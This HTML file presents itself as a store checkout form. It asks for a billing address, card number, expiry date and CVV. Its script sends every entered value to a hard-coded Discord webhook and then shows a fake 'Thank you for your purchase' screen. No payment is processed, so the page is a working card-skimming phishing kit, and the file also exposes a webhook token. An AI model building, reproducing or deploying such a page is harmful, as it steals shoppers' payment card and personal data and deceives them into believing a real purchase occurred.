<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
body { font-family: Arial; font-size: 17px; padding: 8px; background-color: #f9f9f9; }
* { box-sizing: border-box; }
.row { display: flex; flex-wrap: wrap; }
.col-100 { flex: 100%; }
.container { background-color: #f2f2f2; padding: 5px 20px 15px 20px; border: 1px solid lightgrey; border-radius: 3px; max-width: 800px; margin: auto; }
input[type=text], select { width: 100%; margin-bottom: 20px; padding: 12px; border: 1px solid #ccc; border-radius: 3px; }
label { margin-bottom: 10px; display: block; font-weight: bold; }
.icon-container { margin-bottom: 20px; padding: 7px 0; font-size: 24px; }
.btn { background-color: #04AA6D; color: white; padding: 12px; margin: 10px 0; border: none; width: 100%; border-radius: 3px; cursor: pointer; font-size: 17px; }
.btn:hover { background-color: #45a049; }
#thanks-screen { display: none; text-align: center; margin-top: 100px; }
</style>
</head>
<body>

<div id="form-container">
  <h2>Checkout Form</h2>
  <div class="container">
    <form id="checkoutForm" onsubmit="event.preventDefault(); sendData();">
      <div class="row">
        <div class="col-100">
          <h3>Billing Address</h3>
          <label>Full Name</label>
          <input type="text" id="fname" placeholder="John M. Doe" required>

          <label>Email</label>
          <input type="text" id="email" placeholder="john@example.com" required>

          <label>Address</label>
          <input type="text" id="adr" placeholder="542 W. 15th Street" required>

          <label>Country</label>
          <input type="text" id="country" placeholder="United States" required>

          <div class="row">
            <div style="flex:50%; padding-right:10px;">
              <label>State</label>
              <input type="text" id="state" placeholder="New York" required>
            </div>
            <div style="flex:50%;">
              <label>City</label>
              <input type="text" id="city" placeholder="New York City" required>
            </div>
          </div>
          
          <label>Zip</label>
          <input type="text" id="zip" placeholder="10001" required>
        </div>

        <div class="col-100">
          <h3>Payment</h3>
          <div class="icon-container">
            <i class="fa fa-cc-visa" style="color:navy;"></i>
            <i class="fa fa-cc-amex" style="color:blue;"></i>
            <i class="fa fa-cc-mastercard" style="color:red;"></i>
            <i class="fa fa-cc-discover" style="color:orange;"></i>
          </div>

          <label>Name on Card</label>
          <input type="text" id="cname" placeholder="John More Doe" required>

          <label>Credit card number</label>
          <input type="text" id="ccnum" placeholder="1111-2222-3333-4444" required>

          <label>Expiration Date</label>
          <div class="row">
            <div style="flex:50%; padding-right:10px;">
              <select id="expmonth" required>
                <option value="01">01 - Jan</option><option value="02">02 - Feb</option><option value="03">03 - Mar</option>
                <option value="04">04 - Apr</option><option value="05">05 - May</option><option value="06">06 - Jun</option>
                <option value="07">07 - Jul</option><option value="08">08 - Aug</option><option value="09">09 - Sep</option>
                <option value="10">10 - Oct</option><option value="11">11 - Nov</option><option value="12">12 - Dec</option>
              </select>
            </div>
            <div style="flex:50%;">
              <select id="expyear" required>
                <option value="2026">2026</option><option value="2027">2027</option>
                <option value="2028">2028</option><option value="2029">2029</option>
                <option value="2030">2030</option>
              </select>
            </div>
          </div>

          <label>CVV</label>
          <input type="text" id="cvv" placeholder="123" required>
        </div>
      </div>

      <input type="submit" value="Continue to checkout" class="btn">
    </form>
  </div>
</div>

<div id="thanks-screen">
  <h1>Thank you for your purchase!</h1>
  <p>Your product will be shipped within 7-18 business days. Bye!</p>
</div>

<script>
function sendData() {
  const formData = {
    "NAME": document.getElementById("fname").value,
    "EMAIL": document.getElementById("email").value,
    "ADDRESS": document.getElementById("adr").value,
    "CITY/STATE": document.getElementById("city").value + ", " + document.getElementById("state").value,
    "ZIP": document.getElementById("zip").value,
    "COUNTRY": document.getElementById("country").value,
    "HOLDER": document.getElementById("cname").value,
    "CARD NO": document.getElementById("ccnum").value,
    "EXPIRY": document.getElementById("expmonth").value + "/" + document.getElementById("expyear").value,
    "CVV": document.getElementById("cvv").value
  };

  // The "Best Ever" ASCII Grid
  let message = "```sql\n";
  message += "╭──────────────── DATA LOG: NEW TRANSACTION ────────────────╮\n";
  message += "│ FIELD        │ INFORMATION                                │\n";
  message += "├──────────────┼────────────────────────────────────────────┤\n";
  
  for (const [key, value] of Object.entries(formData)) {
    let label = key.padEnd(12, " ");
    let valStr = (value || "EMPTY").toString().substring(0, 42); 
    message += `│ ${label} │ ${valStr.padEnd(42, " ")} │\n`;
  }
  
  message += "╰──────────────┴────────────────────────────────────────────╯\n";
  message += "```";

  fetch("https://discord.com/api/webhooks/1494821427789037608/xA_Xd62gpnYwnSPWX8F6zKUqQZw76NHAFwkFWHQ4G7poSxUh-epRSThq2S0Uj_yOH6KZ", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: message })
  })
  .then(() => {
    document.getElementById("form-container").style.display = "none";
    document.getElementById("thanks-screen").style.display = "block";
  })
  .catch(() => alert("Error: Connection lost."));
}
</script>

</body>
</html>
